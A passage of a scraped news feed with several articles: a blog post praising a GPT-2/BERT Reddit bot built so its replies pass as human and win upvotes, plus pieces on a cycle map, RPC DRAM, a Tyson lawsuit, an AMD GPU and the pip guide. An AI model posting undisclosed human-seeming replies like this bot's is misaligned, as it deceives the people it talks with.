	<img width="939" height="525" src="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=939&amp;h=525&amp;crop=1" alt="Building a realistic Reddit AI that get upvoted in&nbsp;Python" loading="lazy" srcset="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png 939w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=150&amp;h=84&amp;crop=1 150w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=300&amp;h=168&amp;crop=1 300w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=768&amp;h=429&amp;crop=1 768w" sizes="(max-width: 939px) 100vw, 939px" data-attachment-id="8643" data-permalink="https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/gpt2_bert_workflow1/" data-orig-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png" data-orig-size="939,525" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="gpt2_bert_workflow[1]" data-image-description="" data-medium-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=300" data-large-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=939">
	<!-- .entry-header -->

	<div>
		
<p>Sometimes I find these AI / programming hobby projects that I just wished I had thought ofâ€¦ </p>



<p><a href="https://www.linkedin.com/in/willstedden/"><strong>Will Stedden</strong></a> combined OpenAIâ€™s <strong><a href="https://openai.com/blog/better-language-models/">GPT-2</a></strong> deep learning text generation model with another deep-learning language model by Google called <strong><a href="https://towardsdatascience.com/bert-explained-state-of-the-art-language-model-for-nlp-f8b21a9b6270">BERT</a></strong> (Bidirectional Encoder Representations from Transformers) and created an elaborate architecture that had one purpose: <strong><em>posting the best replies on Reddit.</em></strong></p>



<p>The architecture is shown at the end of this post â€” copied from Willâ€™s original blog<em> <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">here</a></em>. Moreover, you can read&nbsp;<a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">this post</a>&nbsp;for details regarding the construction of the system. But let me see whether I can explain you what it does in simple language. </p>



<p>The below is what a Reddit comment and reply thread looks like. We have <em>str8cokane </em>making a comment to an original post (not in the picture), and then <em>tupperware-party</em> making a reply to that comment, followed by another reply by <em>str8cokane</em>. Basically, Will wanted to create an AI/bot that could write replies like <em>tupperware-party</em> that real people like <em>str8cokane</em> would not be able to distinguish from â€œreal-peopleâ€ replies.</p>



<p>Note that with 4 <strong>points</strong>, <em>str8cokane</em>â€˜s original comments was <em><strong>â€œlikedâ€</strong></em> more than <em>tupperware-party</em>â€˜s reply and <em>str8cokane</em>â€˜s next reply, which were only <strong><em>upvoted </em></strong>2 and 1 times respectively.</p>



<figure><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party3.png" alt="gpt2-bert on China"><figcaption>Example reddit comment and replies (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/</a>)</figcaption></figure>



<p>So hereâ€™s what the final architecture looks like, and my attempt to explain it to you.</p>



<ol><li>Basically, we start in the upper left corner, where Will uses a database (i.e. <em>corpus</em>) of Reddit comments and replies to fine-tune a standard, pretrained GPT-2 model to get it to be good at <strong>generating (red: â€œfakeâ€) realistic Reddit replies</strong>. </li><li>Next, in the upper middle section, these fake replies are piped into a standard, pretrained BERT model, along with the original, real Reddit comments and replies. This way the BERT model sees both real and fake comments and replies. Now, <strong>our goal is to make replies that are undistinguishable from real replies</strong>. Hence, this is the task the BERT model gets. And we keep fine-tuning the original GPT-2 generator until the BERT discriminator that follows is no longer able to distinguish fake from real replies. Then the generator is â€œfoolingâ€ the discriminator, and we know we are generating fake replies that look like real ones! <br><em>You can find more information about such generative adversarial networks <a href="https://paulvanderlaken.com/2017/10/30/generative-adversarial-networks-gan-explained/">here</a>.</em></li><li>Next, in the top right corner, we fine-tune another BERT model. This time we give it the original Reddit comments and replies along with the amount of times they were upvoted (i.e. sort of like likes on facebook/twitter). Basically, we train a BERT model to <strong>predict for a given reply, how much likes it is going to get</strong>.</li><li>Finally, we can go to production in the lower lane. We give a real-life comment to the GPT-2 generator we trained in the upper left corner, which produces several fake replies for us. These candidates we run through the BERT discriminator we trained in the upper middle section, which determined which of the fake replies we generated look most real. Those fake but realistic replies are then input into our trained BERT model of the top right corner, which predicts for every fake but realistic reply the amount of likes/upvotes it is going to get. Finally, <strong>we pick and reply with the fake but realistic reply that is predicted to get the most upvotes!</strong></li></ol>



<figure><p><a href="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"><img src="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"></a>
</p><figcaption>What Willâ€™s final architecture, combining GPT-2 and BERT, looked like (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org</a>)</figcaption></figure>



<p>The results are astonishing! Willâ€™s bot sounds like a real youngster internet troll! Do have a look at <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">the original blog</a>, but here are some examples. Note that <em>tupperware-party</em> â€” the Reddit user from the above example â€” is actually Willâ€™s AI. </p>



<figure><a href="https://www.reddit.com/r/sciencefiction/comments/evqiti/dune_logo_unveiled_at_event_copyright_claimants/fg44yzw/?context=3"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party1.png" alt="COMMENT: 'Duneâ€™s fandom is old and intense, and a rich thread in the cultural fabric of the internet generation' BOT_REPLY:'Duneâ€™s fandom is overgrown, underfunded, and in many ways, a poor fit for the new, faster internet generation.'"></a></figure>



<figure><a href="https://www.reddit.com/r/BurningMan/comments/ep6pyq/playa_lung/feilsjn/?context=8&amp;depth=9"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party2.png" alt="bot responds to specific numerical bullet point in source comment"></a></figure>



<p>Will ends his blog with <a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">a link to the tutorial</a> if you want to build such a bot yourself. Have a try!</p>



<p>Moreover, he also notes the ethical concerns:</p>



<blockquote><p>I know there are definitely some ethical considerations when creating something like this. The reason Iâ€™m presenting it is because I actually think it is&nbsp;<a href="https://www.wired.com/story/company-wants-billions-make-ai-safe-humanity/">better</a>&nbsp;for more people to know about and be able to grapple with this kind of technology. If just a few people know about the capacity of these machines, then it is more likely that those small groups of people can abuse their advantage.</p><p>I also think that this technology is going to change the way we think about whatâ€™s important about being human. After all, if a computer can effectively automate the paper-pushing jobs weâ€™ve constructed and all the bullshit we create on the internet to distract us, then maybe itâ€™ll be time for us to move on to something more meaningful.</p><p>If you think what Iâ€™ve done is a problem feel free to&nbsp;email me&nbsp;, or publically shame me on&nbsp;<a href="https://twitter.com/bonkerfield">Twitter</a>.</p><cite>Will Stedden via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/2020/02/combining-gpt-2-and-bert/</a></cite></blockquote>








						<!-- .post-categories -->	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-## -->
			
<!-- #comments -->
		
		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->
	</div></div>]]>
            </description>
            <link>https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146048</guid>
            <pubDate>Thu, 19 Nov 2020 03:55:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An ingenious vintage German cycle map (2014)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145965">thread link</a>) | @colinprince
<br/>
November 18, 2020 | http://blog.systemed.net/post/10 | <a href="https://web.archive.org/web/*/http://blog.systemed.net/post/10">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>10.</p><div id="text">
				
				<p>We cycled the Swiss part of the Rhine Cycleway last week, with our <a href="https://www.bikefriday.com/bicycles/touring/1248">folding</a> <a href="http://airnimal.eu/products/chameleon/performance-sport/">bikes</a> neatly stowed in suitcases for the flight. A combination of <em><a href="http://cycle.travel/">cycle.travel</a></em> (natch), the Cicerone guide, and the excellent <a href="https://itunes.apple.com/gb/app/mapout/id477094081?l=en&amp;mt=8">MapOut</a> app guided us safely along the way: a very modern combination of mapping styles.</p><p>Wandering around ZÃ¼rich, waiting for our flight home, I was intrigued by this cycle map in the window of a (closed) antiquarian bookstore:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_1.jpg"></p><p>And if that isnâ€™t clear enough from the pic snatched through a window, hereâ€™s a better excerpt from <a href="http://www.ak-ansichtskarten.de/shop/ak/46/back4684588/Rueckseite-Deutsche-Strassenprofilkarte-fuer-Radfahrer-Strassburg-und-Umgebung-Naumann-s-Fahrraeder-Seidel-Naumann-Dresden.jpg">an example</a> I found online:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_2.jpg"></p><p>On major climbs, rather than strictly following the two-dimensional curves of the route as a conventional map would do, the map shows a miniature gradient profile for that particular hill.</p><p>Bending geometry to show a subjective view of space is nothing unusual. The Tube map (and its many imitators) famously do it, as do the one-dimensional strip maps that Laurence Penney has <a href="http://www.youshouldliketypetoo.com/blog/misc/one-dimensional-maps/">lovingly curated</a>&nbsp;(and, indeed, one of Laurenceâ€™s maps has a <a href="http://www.youshouldliketypetoo.com/wp-content/uploads/2012/12/one-dimensional-maps-14.jpg">passing resemblance</a> to these German sheets). But Iâ€™ve never seen quite this approach taken before. Itâ€™s a recognition that â€“ just as distance is immaterial to the Tube passenger â€“ to the cyclist, hills are as much part of the â€˜distance travelledâ€™ as are the ticking miles on the cycle computer.</p><p>Not that the Radfahrer in question would have had cycle computers, of course. There appear to have been 80 of these sheets, published by&nbsp;Mittelbach's Verlag of Leipzig with the co-operation and support of the national German cycling organisations <em>(unter Mitwirkung der GauverbaÌˆnde des Deutschen Radfahrerbundes und der Konsulate der Allgemeinen Radfahrer-Union)</em>. They seem to date from the beginning of the 20th century, and are not yet collectable, if the <a href="http://www.abebooks.co.uk/Deutsche-Strassenprofilkarte-Radfahrer-Mitwirkung-Gauverb%C3%A4nde-Deutschen/6461038791/bd">prices on Abebooks</a> are anything to go by.</p><p>And in one of those curious coincidencesâ€¦</p><p>I originally finished this post with â€œ<span>I donâ€™t expect to see a revival any day soonâ€, but the day after I posted this, Sustrans Midlands retweeted a link to <a href="https://twitter.com/Lunto_Sustrans/status/496934542880833536">exactly such a map</a>. This â€˜Accessible Mapâ€™ of Queenstown, New Zealand, was particularly intended for wheelchair users and other people who find steep slopes challenging:</span></p><p><img src="http://blog.systemed.net/images/original/modern_elevation_map.jpg"></p><p><span>You can download the full map as a PDF from drcqueenstown.co.nz. The cartographer, Toby Eglesfield, has also written an <a href="http://www.tobyeglesfield.com/a-map-showing-the-steepness-of-streets/">extensive, well-illustrated blog post</a> explaining the design choices he made â€“ and&nbsp;in the comments, two people raise the idea of generating such a map from OpenStreetMap data. Now wouldnâ€™t that be an interesting challengeâ€¦</span></p>
				<p id="date">Posted on Tuesday 5 August 2014. 
				<a href="http://blog.systemed.net/post/10">Link.</a></p>
				<h3>Previous post: <a href="http://blog.systemed.net/post/9">Normalising OpenStreetMap tag ambiguities by location.</a></h3>
			</div></div>]]>
            </description>
            <link>http://blog.systemed.net/post/10</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145965</guid>
            <pubDate>Thu, 19 Nov 2020 03:39:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RPC DRAM support in open source DRAM controller]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25145897">thread link</a>) | @pabs3
<br/>
November 18, 2020 | https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/ | <a href="https://web.archive.org/web/*/https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>
          <span>Published:</span>
          <time>Oct 28 2020</time>
        </p>
          <p>
            <span>Topics:</span>
            open hardware, open ASICs, open FPGA</p>
      </div><div>
        <p>The Internet of Things is one of the areas that is hugely benefiting from miniaturization of semiconductor technologies, as more computing power can be encapsulated into increasingly smaller devices. Shrinking in size and requiring less power, various devices - including AI-capable ones - are applied in ways that were not possible a few years ago. One of the new and exciting developments in this space is the emergence of <a href="https://etronamerica.com/products/rpc-dram/">RPC (reduced pin-count) DRAM</a> - a small form factor memory, for which Antmicro has developed support in the open source memory controller, LiteDRAM. Our contribution, already made available on <a href="https://github.com/antmicro/litedram/tree/rpc-dram-support">GitHub</a> is being polished and undergoing final tests, and will be mainlined shortly.</p>

<h3 id="what-is-rpc-dram">What is RPC DRAM</h3>

<p>Standard modern DRAM chips, with their small but not miniscule footprints and rather high I/O requirements, are impossible to use in space-constrained applications. By using a large number of pins in the device they connect to, they can also push the envelope of the device itself even more, requiring larger and more expensive packages of the FPGA or SoC used. <br>
And while many edge devices could easily do with a smaller amount (e.g. sub-1Gb) of RAM than what modern memory parts offer, it is impossible to cut a RAM chip in half and get less memory capacity. Well, at least until now - kind of.</p>

<p>The so-called RPC (Reduced Pin Count) DRAM - a new technology from Etron - has the potential to profoundly impact the AI, IoT and VR/AR markets. It is a tiny memory chip family which can get as small as 1.96mm x 4.63mm, offering 256Mbits and high bandwidth (the same as DDR3) using only 10% of the DDR3 PCB area and only half of the SoC or FPGA pins that the DDR3 memory takes up. Its clock speed can go up to 1200MHz, with bandwidth of up to 4800 Mb/s.</p>

<p><img src="https://antmicro.com/blog/images/LiteDRAM_with_RPC_RAM_blog-note.png" alt="DDR RAM and RPC DRAM comparison"></p>

<p>RPC DRAM is ideal for space-constrained edge AI applications that locally process data such as video, audio or image, where, apart from space saving, low power consumption is critical. The small number of pins used by RPC DRAM leaves more available resources for other system functionalities, while the possibility of stacking multiple RPC DRAM chips on top of one another for further layout optimization makes the technology even more appealing. It also enables interesting scenarios like <a href="https://antmicro.com/blog/2020/10/open-chiplet-initiative/#future-developments">embedding in a chiplet-based SiP</a>, or even bare-die integration with small FPGAs for a powerful, Linux-capable device. But to use the memory with FPGAs, you need to interface with it using a DRAM controller - and that is where our latest work with LiteDRAM comes in.</p>

<h3 id="litedram-and-open-source-ip-ecosystem">LiteDRAM and open source IP ecosystem</h3>

<p>LiteDRAM is a configurable memory controller that is part of LiteX, an open source SoC builder that we are developing and using to design FPGA-based systems. By creating support for RPC DRAM in LiteDRAM we have enabled the miniscule memory to be added to products that we build and to the whole LiteX ecosystem. This enables our customerâ€™s devices to run more compute-hungry applications or full-fledged operating systems such as Linux in dedicated SoCs created by Antmicro on demand.</p>

<p>We use and contribute to LiteDRAM, LiteX and other open source IP to develop unique designs interfaced with DDR memories for high-bandwidth video and other data processing systems; and RPC DRAM support is just one example of the enablement work we are performing in the ecosystem. Combined with the exciting work related to open source we are performing as part of <a href="https://antmicro.com/blog/2020/07/swerv-cores-tools-ecosystem/">CHIPS Alliance</a>, <a href="https://antmicro.com/blog/2020/06/skywater-open-source-pdk/">SkyWater PDK</a> and the fantastic enregy catalyzed by the open <a href="https://antmicro.com/technologies/risc-v/">RISC-V</a> CPU architecture (which is an obvious candidate for combining with RPC RAM both in soft- and hard CPU contexts), future is looking bright for tiny, open, ML-capable systems.</p>

<h3 id="antmicros-open-source-fpga-ip">Antmicroâ€™s open source FPGA IP</h3>

<p>We often use FPGAs to build a wide array of configurable systems for our customers, leveraging the flexibility and customizability that this technology offers. We create open source FPGA IPs that are reusable across various designs and platforms without any licensing restrictions imposed on our customers. Antmicroâ€™s open source IP cores portfolio includes MIPI CSI, MIDI, PCIe, USB, Ethernet etc.</p>

<p>The FPGA systems that we build consist of modern, vendor-neutral components that ensure future-proofness and give our clients full control over the product. Reach out to us at <a href="mailto:contact@antmicro.com">contact@antmicro.com</a> if youâ€™d like to get a specialized FPGA-based system performing complex tasks.</p>

      </div></div>]]>
            </description>
            <link>https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145897</guid>
            <pubDate>Thu, 19 Nov 2020 03:29:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawsuit: Tyson managers bet money on how many workers would contract Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145734">thread link</a>) | @AndrewBissell
<br/>
November 18, 2020 | https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/ | <a href="https://web.archive.org/web/*/https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div><figure><img width="2016" height="1512" src="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg" srcset="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg 2016w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-300x225.jpg 300w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1024x768.jpg 1024w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-768x576.jpg 768w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1536x1152.jpg 1536w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-80x60.jpg 80w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-265x198.jpg 265w" sizes="(max-width: 2016px) 100vw, 2016px" alt="" title="Workstation Dividers at Tyson Facility"><figcaption>Tyson workers have had plastic dividers separating them on the production line. (Photo provided by Tyson Fresh Meats)</figcaption></figure></div>
        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a â€œwillful and wanton disregard for workplace safety.â€</p>
<p>In a written statement issued Thursday afternoon, Tyson Foodsâ€™ president and chief executive officer, Dean Banks, said: â€œWe are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>â€œWe have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, weâ€™ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>â€œOur top priority is and remains the health and safety of our team members.â€</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant â€” over a third of the facilityâ€™s workforce â€” contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there â€œshook [him] to the core,â€ plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the â€œglorified fluâ€ and told workers not to worry about it because â€œitâ€™s not a big dealâ€ and â€œeveryone is going to get it.â€ On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, â€œWe all have symptoms â€” you have a job to do.â€ After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didnâ€™t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 â€œthank you bonusesâ€ to employees who turned up for every scheduled shift for three months â€” a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it â€œvigorously disputesâ€ the plaintiffsâ€™ claims and has â€œinvested millions of dollars to provide employees with safety and risk-mitigation equipment.â€</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tysonâ€™s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic â€œat the direction of a federal officerâ€ â€” President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez familyâ€™s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had â€œdirectedâ€ Tyson to do anything.</p>
<p>The Waterloo facility is Tysonâ€™s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

        </div></div>]]>
            </description>
            <link>https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145734</guid>
            <pubDate>Thu, 19 Nov 2020 02:57:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AMD Announces New â€œInstinct MI100â€ GPU, Breaks the 10 Tflops Barrier in FP64]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145600">thread link</a>) | @luord
<br/>
November 18, 2020 | https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/ | <a href="https://web.archive.org/web/*/https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content-area">
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/48301387cddb344c254ee94cde7f04d7/p/uploads/2020/11/db6591d4-1.png" alt="" width="700" height="313"></p>
<p>With the rising demand for HPC and AI-powered cloud applications comes a need for very powerful datacenter GPUs. Usually NVIDIA is the king of this field, but AMDâ€™s latest MI100 GPU presents some serious competition.</p>
<h2 role="heading" aria-level="2">A Card For The HPC Market</h2>
<p>The card is fast, seriously fast. NVIDIAâ€™s high end A100 GPU peaks at&nbsp;9.7 TFLOPS in FP64 workloads. The new â€œAMD Instinct MI100â€ leaps past that at 11.5 TFLOPS.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/2f6292f97a12046b544017f07246a4f8/p/uploads/2020/11/8d6e8097.png" alt="" width="700" height="312"></p>
<p>Of course, NVIDIAâ€™s cards support other speedup techniques for AI-specific workloads in different number formats, such as the TensorFloat-32 precision format and<a href="https://www.cloudsavvyit.com/4796/nvidias-new-ampere-gpu-is-a-game-changer-for-artificial-intelligence/"> fine-grained structured sparsity</a>. For AI and Machine Learning workloads, NVIDIA is still king, as their cards are built specifically for tensor-based operations.</p>
<p>But, for general purpose High Performance Computing, the MI100 takes the crown for raw compute power. Plus, itâ€™s nearly half the price, and is much more efficient per watt.</p>
<p>On top of the other improvements, the new architecture also brings mixed-precision improvements, with their â€œMatrix Coreâ€ technology delivering 7x greater FP16 performance compared to their prior generation of cards.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/6588bb99d6c97c60163b08630e9b8d86/p/uploads/2020/11/292c692b.png" alt="" width="700" height="216"></p>
<p>AMD CPUs and Instinct GPUS are <a href="https://www.olcf.ornl.gov/frontier/">both powering two of the US Department of Energyâ€™s exascale supercomputers</a>. The â€œFrontierâ€ supercomputer is planned to be built next year with current Epyc CPUs and MI100s, and will deliver more than 1.5 exaflops of peak computing power. The â€œEl Capitanâ€ supercomputer is planned to be built in 2023 on next gen hardware, and will deliver more than 2 exaflops of double precision power.</p>
<h2 role="heading" aria-level="2">Can ROCm Live Up to CUDA?</h2>
<p>Of course, all of this power is useless if the software doesnâ€™t support it. Itâ€™s no secret that NVIDIA has managed to make machine learning a bit of a walled garden.</p>
<p>NVIDIAâ€™s compute framework is called <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a>, or&nbsp;Compute Unified Device Architecture. Itâ€™s proprietary, and only works with their cards. But since their cards have historically been the fastest, many applications are only built with CUDA support first and foremost.</p>
<p>There are cross-platform programming models, most notably OpenCL, which AMD supports very well <a href="https://rocmdocs.amd.com/en/latest/">with their ROCm platform</a>. Both NVIDIA cards and AMD cards support OpenCL, but because NVIDIA only supports it by transpiling to CUDA, itâ€™s actually slower to use OpenCL with an NVIDIA card. Because of this, not all applications will support it.</p>
<p>Ultimately, youâ€™ll need to do your own research and see if the application you intend to run can be run on AMD cards, and maybe be prepared for some tinkering and bug fixing. NVIDIA GPUs on the otherhand are mostly plug and play, so even if AMD is faster, NVIDIA can continue to hinder them with closed-source software.</p>
<p>However, this situation is getting betterâ€”AMD is committed to open sourcing everything and creating an open environment. Tensorflow and PyTorch, two very popular ML frameworks, both support the ROCm ecosystem.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/03aae3c52689bd7fd58e8278df8fefac/p/uploads/2020/11/301c98b9.png" alt="" width="697" height="479"></p>
<p>Hopefully the raw specs of AMDâ€™s latest offerings can push the industry to a more competitive environment. After all, theyâ€™re being put to use in supercomputers</p>
</div></div>]]>
            </description>
            <link>https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145600</guid>
            <pubDate>Thu, 19 Nov 2020 02:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Changes to the pip dependency resolver in 20.3]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25145396">thread link</a>) | @di
<br/>
November 18, 2020 | https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020 | <a href="https://web.archive.org/web/*/https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="user-guide">

<div id="running-pip">
<h2>Running pip<a href="#running-pip" title="Permalink to this headline">Â¶</a></h2>
<p>pip is a command line program. When you install pip, a <code><span>pip</span></code> command is added
to your system, which can be run from the command prompt as follows:</p>
<div>
<p><label for="tab-set--0-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>python</span> <span>-m</span> <span>pip</span></code> executes pip using the Python interpreter you
specified as python. So <code><span>/usr/bin/python3.7</span> <span>-m</span> <span>pip</span></code> means
you are executing pip for your interpreter located at /usr/bin/python3.7.</p>
</div>
<p><label for="tab-set--0-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>py</span> <span>-m</span> <span>pip</span></code> executes pip using the latest Python interpreter you
have installed. For more details, read the <a href="https://docs.python.org/3/using/windows.html#launcher">Python Windows launcher</a> docs.</p>
</div>
</div>
</div>
<div id="installing-packages">
<h2>Installing Packages<a href="#installing-packages" title="Permalink to this headline">Â¶</a></h2>
<p>pip supports installing from <a href="https://pypi.org/">PyPI</a>, version control, local projects, and
directly from distribution files.</p>
<p>The most common scenario is to install from <a href="https://pypi.org/">PyPI</a> using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirement-specifiers"><span>Requirement Specifiers</span></a></p>
<div>
<p><label for="tab-set--1-input--1">Unix/macOS</label></p><div>
